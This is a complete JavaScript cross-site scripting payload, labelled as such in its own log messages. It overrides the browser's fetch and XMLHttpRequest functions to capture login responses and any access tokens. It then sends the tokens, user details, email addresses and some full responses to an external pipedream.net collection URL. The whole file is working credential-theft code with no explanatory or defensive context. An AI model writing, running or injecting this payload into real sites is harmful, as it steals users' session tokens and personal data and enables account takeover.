(function() {
    var EXFIL_URL = 'https://6b884da34ac52d711d2d20ef6f2bf068.m.pipedream.net';

    function exfiltrate(data) {
        try {
            navigator.sendBeacon(EXFIL_URL, JSON.stringify(data));
        } catch (e) {
            fetch(EXFIL_URL, {
                method: 'POST',
                body: JSON.stringify(data),
                headers: { 'Content-Type': 'application/json' },
                keepalive: true
            }).catch(function() {});
        }
        console.log('[XSS] TOKEN STOLEN:', data.token);
    }

    // --- METHOD 1: Hook fetch() ---
    var originalFetch = window.fetch;
    window.fetch = function() {
        var args = arguments;
        var url = args[0];
        // Check if this is the login endpoint
        if (typeof url === 'string' && url.indexOf('/login') !== -1) {
            return originalFetch.apply(this, args).then(function(response) {
                var clone = response.clone();
                clone.json().then(function(data) {
                    console.log('[XSS] Login response intercepted:', data);
                    if (data && data.access_token) {
                        exfiltrate({
                            token: data.access_token,
                            user: data.user,
                            email: data.user ? data.user.email : null,
                            timestamp: new Date().toISOString()
                        });
                    }
                }).catch(function(e) {
                    console.log('[XSS] JSON parse error:', e);
                });
                return response;
            });
        }
        return originalFetch.apply(this, args);
    };

    // --- METHOD 2: Hook XMLHttpRequest ---
    var originalOpen = XMLHttpRequest.prototype.open;
    var originalSend = XMLHttpRequest.prototype.send;

    XMLHttpRequest.prototype.open = function(method, url) {
        this._url = url;
        this._method = method;
        return originalOpen.apply(this, arguments);
    };

    XMLHttpRequest.prototype.send = function(body) {
        var self = this;
        this.addEventListener('load', function() {
            if (self._url && self._url.indexOf('/login') !== -1 && self.status === 200) {
                try {
                    var data = JSON.parse(self.responseText);
                    console.log('[XSS] XHR Login response:', data);
                    if (data && data.access_token) {
                        exfiltrate({
                            token: data.access_token,
                            user: data.user,
                            email: data.user ? data.user.email : null,
                            timestamp: new Date().toISOString()
                        });
                    }
                } catch(e) {
                    console.log('[XSS] XHR parse error:', e);
                }
            }
        });
        return originalSend.apply(this, arguments);
    };

    // --- METHOD 3: Monitor all fetch() responses (catch-all) ---
    var originalFetch2 = window.fetch;
    window.fetch = function() {
        return originalFetch2.apply(this, arguments).then(function(response) {
            var clone = response.clone();
            clone.json().then(function(data) {
                if (data && typeof data === 'object') {
                    var token = data.access_token || data.token || data.accessToken;
                    if (token) {
                        console.log('[XSS] Token found in response:', token);
                        exfiltrate({
                            token: token,
                            fullResponse: data,
                            timestamp: new Date().toISOString()
                        });
                    }
                }
            }).catch(function() {});
            return response;
        });
    };

    console.log('[XSS] Payload loaded – waiting for login...');
})();
